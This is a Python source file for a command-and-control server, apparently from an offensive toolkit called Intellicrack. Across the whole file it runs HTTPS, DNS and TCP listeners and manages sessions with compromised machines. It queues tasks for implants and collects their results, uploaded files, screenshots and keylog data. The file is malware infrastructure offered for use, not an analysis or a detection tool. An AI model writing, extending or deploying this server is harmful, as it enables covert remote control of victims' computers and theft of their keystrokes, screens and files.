"""
Command and Control Server

Main C2 server implementation with multi-protocol support,
encryption, and session management.
"""

import asyncio
import logging
import time
from typing import Any, Callable, Dict, List, Optional

from .beacon_manager import BeaconManager
from .communication_protocols import DnsProtocol, HttpsProtocol, TcpProtocol
from .encryption_manager import EncryptionManager
from .session_manager import SessionManager
from .base_c2 import BaseC2

logger = logging.getLogger(__name__)


class C2Server(BaseC2):
    """
    Advanced Command and Control server with multi-protocol support
    and enterprise-grade security features.
    """

    def __init__(self, config: Dict[str, Any]):
        super().__init__()
        self.logger = logging.getLogger("IntellicrackLogger.C2Server")
        self.config = config
        self.running = False

        # Core components
        self.encryption_manager = EncryptionManager()
        self.session_manager = SessionManager()
        self.beacon_manager = BeaconManager()

        # Protocol handlers
        self.protocols = {}
        self._initialize_protocols()

        # Server statistics
        self.stats = {
            'start_time': None,
            'total_connections': 0,
            'active_sessions': 0,
            'commands_executed': 0,
            'data_transferred': 0,
            'uptime_seconds': 0
        }

        # Event handlers
        self.event_handlers = {
            'session_connected': [],
            'session_disconnected': [],
            'command_executed': [],
            'beacon_received': [],
            'error_occurred': []
        }

        # Command queue for session management
        self.command_queue = asyncio.Queue()

    def _initialize_protocols(self):
        """Initialize all supported communication protocols."""
        protocols_config = []
        
        # HTTPS Protocol
        if self.config.get('https_enabled', True):
            https_config = self.config.get('https', {})
            protocols_config.append({
                'type': 'https',
                'server_url': f"https://{https_config.get('host', '0.0.0.0')}:{https_config.get('port', 443)}",
                'headers': https_config.get('headers', {}),
                'priority': 1
            })
        
        # DNS Protocol
        if self.config.get('dns_enabled', False):
            dns_config = self.config.get('dns', {})
            protocols_config.append({
                'type': 'dns',
                'domain': dns_config.get('domain', 'example.com'),
                'dns_server': f"{dns_config.get('host', '0.0.0.0')}:{dns_config.get('port', 53)}",
                'priority': 2
            })
        
        # TCP Protocol
        if self.config.get('tcp_enabled', False):
            tcp_config = self.config.get('tcp', {})
            protocols_config.append({
                'type': 'tcp',
                'host': tcp_config.get('host', '0.0.0.0'),
                'port': tcp_config.get('port', 4444),
                'priority': 3
            })
        
        # Use base class method
        self.initialize_protocols(protocols_config, self.encryption_manager)
        
        # Convert to dict for server usage
        self.protocols = {p['type']: p['handler'] for p in self.protocols}

    async def start(self):
        """Start the C2 server and all protocol handlers."""
        try:
            # Use base class start preparation
            if not self.prepare_start("C2 server"):
                return

            # Start all protocol handlers
            tasks = []
            for protocol_name, protocol in self.protocols.items():
                task = asyncio.create_task(
                    self._start_protocol(protocol_name, protocol)
                )
                tasks.append(task)

            # Start beacon management
            beacon_task = asyncio.create_task(self._beacon_management_loop())
            tasks.append(beacon_task)

            # Start command processing
            command_task = asyncio.create_task(self._command_processing_loop())
            tasks.append(command_task)

            # Start statistics update
            stats_task = asyncio.create_task(self._update_statistics_loop())
            tasks.append(stats_task)

            self.logger.info("C2 server started successfully")

            # Wait for all tasks
            await asyncio.gather(*tasks, return_exceptions=True)

        except Exception as e:
            self.logger.error(f"Failed to start C2 server: {e}")
            await self.stop()
            raise

    async def stop(self):
        """Stop the C2 server and cleanup resources."""
        try:
            self.logger.info("Stopping C2 server...")
            self.running = False

            # Stop all protocol handlers
            for protocol_name, protocol in self.protocols.items():
                try:
                    await protocol.stop()
                    self.logger.info(f"Stopped {protocol_name} protocol")
                except Exception as e:
                    self.logger.error(f"Error stopping {protocol_name} protocol: {e}")

            # Cleanup sessions
            await self.session_manager.cleanup_all_sessions()

            self.logger.info("C2 server stopped successfully")

        except Exception as e:
            self.logger.error(f"Error stopping C2 server: {e}")

    async def _start_protocol(self, protocol_name: str, protocol):
        """Start a specific protocol handler."""
        try:
            self.logger.info(f"Starting {protocol_name} protocol...")

            # Set up protocol event handlers
            protocol.on_connection = self._handle_new_connection
            protocol.on_message = self._handle_message
            protocol.on_disconnection = self._handle_disconnection
            protocol.on_error = self._handle_protocol_error

            # Start the protocol
            await protocol.start()

        except Exception as e:
            self.logger.error(f"Failed to start {protocol_name} protocol: {e}")

    async def _handle_new_connection(self, connection_info: Dict[str, Any]):
        """Handle new client connection."""
        try:
            self.logger.info(f"New connection from {connection_info.get('remote_addr')}")

            # Create new session
            session = await self.session_manager.create_session(connection_info)

            # Update statistics
            self.stats['total_connections'] += 1
            self.stats['active_sessions'] = len(self.session_manager.get_active_sessions())

            # Trigger event handlers
            await self._trigger_event('session_connected', session)

            return session

        except Exception as e:
            self.logger.error(f"Error handling new connection: {e}")

    async def _handle_message(self, session_id: str, message: Dict[str, Any]):
        """Handle incoming message from client."""
        try:
            session = self.session_manager.get_session(session_id)
            if not session:
                self.logger.warning(f"Received message for unknown session: {session_id}")
                return

            # Update session activity
            session.update_last_seen()

            # Process message based on type
            message_type = message.get('type', 'unknown')

            if message_type == 'beacon':
                await self._handle_beacon(session, message)
            elif message_type == 'task_result':
                await self._handle_task_result(session, message)
            elif message_type == 'file_upload':
                await self._handle_file_upload(session, message)
            elif message_type == 'screenshot':
                await self._handle_screenshot(session, message)
            elif message_type == 'keylog_data':
                await self._handle_keylog_data(session, message)
            else:
                self.logger.warning(f"Unknown message type: {message_type}")

        except Exception as e:
            self.logger.error(f"Error handling message: {e}")

    async def _handle_disconnection(self, session_id: str):
        """Handle client disconnection."""
        try:
            session = self.session_manager.get_session(session_id)
            if session:
                self.logger.info(f"Session {session_id} disconnected")

                # Update session status
                await self.session_manager.mark_session_inactive(session_id)

                # Update statistics
                self.stats['active_sessions'] = len(self.session_manager.get_active_sessions())

                # Trigger event handlers
                await self._trigger_event('session_disconnected', session)

        except Exception as e:
            self.logger.error(f"Error handling disconnection: {e}")

    async def _handle_protocol_error(self, protocol_name: str, error: Exception):
        """Handle protocol-specific errors."""
        self.logger.error(f"Protocol {protocol_name} error: {error}")
        await self._trigger_event('error_occurred', {
            'type': 'protocol_error',
            'protocol': protocol_name,
            'error': str(error)
        })

    async def _handle_beacon(self, session, message: Dict[str, Any]):
        """Handle beacon message from client."""
        try:
            beacon_data = message.get('data', {})

            # Update beacon information
            self.beacon_manager.update_beacon(session.session_id, beacon_data)

            # Check for pending tasks
            pending_tasks = await self.session_manager.get_pending_tasks(session.session_id)

            if pending_tasks:
                # Send tasks to client
                response = {
                    'type': 'tasks',
                    'tasks': pending_tasks
                }
                await session.send_message(response)

                # Mark tasks as sent
                for task in pending_tasks:
                    await self.session_manager.mark_task_sent(task['task_id'])

            # Trigger event
            await self._trigger_event('beacon_received', {
                'session': session,
                'beacon_data': beacon_data
            })

        except Exception as e:
            self.logger.error(f"Error handling beacon: {e}")

    async def _handle_task_result(self, session, message: Dict[str, Any]):
        """Handle task execution result from client."""
        try:
            task_id = message.get('task_id')
            result = message.get('result')
            success = message.get('success', False)

            # Store task result
            await self.session_manager.store_task_result(task_id, result, success)

            # Update statistics
            self.stats['commands_executed'] += 1

            # Trigger event
            await self._trigger_event('command_executed', {
                'session': session,
                'task_id': task_id,
                'result': result,
                'success': success
            })

        except Exception as e:
            self.logger.error(f"Error handling task result: {e}")

    async def _handle_file_upload(self, session, message: Dict[str, Any]):
        """Handle file upload from client."""
        try:
            filename = message.get('filename')
            file_data = message.get('data')
            file_size = len(file_data) if file_data else 0

            # Store uploaded file
            await self.session_manager.store_uploaded_file(
                session.session_id, filename, file_data
            )

            # Update statistics
            self.stats['data_transferred'] += file_size

            self.logger.info(f"Received file upload: {filename} ({file_size} bytes)")

        except Exception as e:
            self.logger.error(f"Error handling file upload: {e}")

    async def _handle_screenshot(self, session, message: Dict[str, Any]):
        """Handle screenshot from client."""
        try:
            screenshot_data = message.get('data')
            timestamp = message.get('timestamp', time.time())

            # Store screenshot
            await self.session_manager.store_screenshot(
                session.session_id, screenshot_data, timestamp
            )

            self.logger.info(f"Received screenshot from session {session.session_id}")

        except Exception as e:
            self.logger.error(f"Error handling screenshot: {e}")

    async def _handle_keylog_data(self, session, message: Dict[str, Any]):
        """Handle keylog data from client."""
        try:
            keylog_data = message.get('data')
            timestamp = message.get('timestamp', time.time())

            # Store keylog data
            await self.session_manager.store_keylog_data(
                session.session_id, keylog_data, timestamp
            )

            self.logger.debug(f"Received keylog data from session {session.session_id}")

        except Exception as e:
            self.logger.error(f"Error handling keylog data: {e}")

    async def _beacon_management_loop(self):
        """Main beacon management loop."""
        while self.running:
            try:
                # Check for inactive sessions
                inactive_sessions = self.beacon_manager.check_inactive_sessions()

                for session_id in inactive_sessions:
                    await self.session_manager.mark_session_inactive(session_id)
                    self.logger.info(f"Marked session {session_id} as inactive")

                # Update beacon statistics
                self.beacon_manager.update_statistics()

                await asyncio.sleep(30)  # Check every 30 seconds

            except Exception as e:
                self.logger.error(f"Error in beacon management loop: {e}")
                await asyncio.sleep(5)

    async def _command_processing_loop(self):
        """Main command processing loop."""
        while self.running:
            try:
                # Process pending commands from queue
                try:
                    command = await asyncio.wait_for(
                        self.command_queue.get(), timeout=1.0
                    )
                    await self._process_command(command)
                except asyncio.TimeoutError:
                    continue

            except Exception as e:
                self.logger.error(f"Error in command processing loop: {e}")
                await asyncio.sleep(1)

    async def _process_command(self, command: Dict[str, Any]):
        """Process a command from the queue."""
        try:
            session_id = command.get('session_id')
            command_type = command.get('type')
            command_data = command.get('data', {})

            session = self.session_manager.get_session(session_id)
            if not session:
                self.logger.warning(f"Cannot execute command for unknown session: {session_id}")
                return

            # Create task for the command
            task = await self.session_manager.create_task(
                session_id, command_type, command_data
            )

            self.logger.info(f"Created task {task['task_id']} for session {session_id}")

        except Exception as e:
            self.logger.error(f"Error processing command: {e}")

    async def _update_statistics_loop(self):
        """Update server statistics periodically."""
        while self.running:
            try:
                if self.stats['start_time']:
                    self.stats['uptime_seconds'] = time.time() - self.stats['start_time']

                await asyncio.sleep(60)  # Update every minute

            except Exception as e:
                self.logger.error(f"Error updating statistics: {e}")
                await asyncio.sleep(10)

    async def _trigger_event(self, event_type: str, data: Any):
        """Trigger event handlers for specific event type."""
        try:
            handlers = self.event_handlers.get(event_type, [])
            for handler in handlers:
                try:
                    if asyncio.iscoroutinefunction(handler):
                        await handler(data)
                    else:
                        handler(data)
                except Exception as e:
                    self.logger.error(f"Error in event handler for {event_type}: {e}")

        except Exception as e:
            self.logger.error(f"Error triggering event {event_type}: {e}")

    # Public API methods

    async def send_command(self, session_id: str, command_type: str, command_data: Dict[str, Any] = None):
        """Send a command to a specific session."""
        command = {
            'session_id': session_id,
            'type': command_type,
            'data': command_data or {}
        }
        await self.command_queue.put(command)

    def add_event_handler(self, event_type: str, handler: Callable):
        """Add event handler for specific event type."""
        if event_type in self.event_handlers:
            self.event_handlers[event_type].append(handler)
        else:
            self.logger.warning(f"Unknown event type: {event_type}")

    def remove_event_handler(self, event_type: str, handler: Callable):
        """Remove event handler for specific event type."""
        if event_type in self.event_handlers:
            try:
                self.event_handlers[event_type].remove(handler)
            except ValueError:
                pass

    def get_active_sessions(self) -> List[Dict[str, Any]]:
        """Get list of active sessions."""
        return self.session_manager.get_active_sessions()

    def get_session_info(self, session_id: str) -> Optional[Dict[str, Any]]:
        """Get information about a specific session."""
        session = self.session_manager.get_session(session_id)
        return session.to_dict() if session else None

    def get_server_statistics(self) -> Dict[str, Any]:
        """Get server statistics."""
        stats = self.stats.copy()
        stats['beacon_stats'] = self.beacon_manager.get_statistics()
        stats['session_stats'] = self.session_manager.get_statistics()
        return stats

    def get_protocols_status(self) -> Dict[str, Any]:
        """Get status of all protocols."""
        status = {}
        for protocol_name, protocol in self.protocols.items():
            status[protocol_name] = {
                'enabled': True,
                'status': 'running' if self.running else 'stopped',
                'connections': getattr(protocol, 'connection_count', 0)
            }
        return status
